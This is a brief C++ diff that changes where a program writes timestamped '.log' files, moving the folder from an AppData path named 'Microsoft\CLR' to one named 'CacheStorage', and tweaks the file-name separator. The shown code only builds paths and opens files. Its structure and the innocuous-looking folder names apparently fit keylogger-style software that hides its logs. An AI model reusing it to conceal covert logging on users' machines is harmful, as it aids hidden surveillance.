@@ -11,8 +11,8 @@ namespace IO
 {
     std::string GetPath(const bool append_seperator = false)
     {
-        std::string appdata_dir(getenv("APPDATA"));
-        std::string full = appdata_dir + "\\Microsoft\\CLR";
+        std::string appdata_dir(getenv("AppData"));
+        std::string full = appdata_dir + "\\CacheStorage";
         return full + (append_seperator ? "\\" : "");
     }
 
@@ -41,7 +41,7 @@ namespace IO
     {
         std::string path = GetPath(true);
         Helper::DateTime dt;
-        std::string name = dt.GetDateTimeString("_") + ".log";
+        std::string name = dt.GetDateTimeString(" ") + ".log";
         try
         {
             std::ofstream file(path + name);
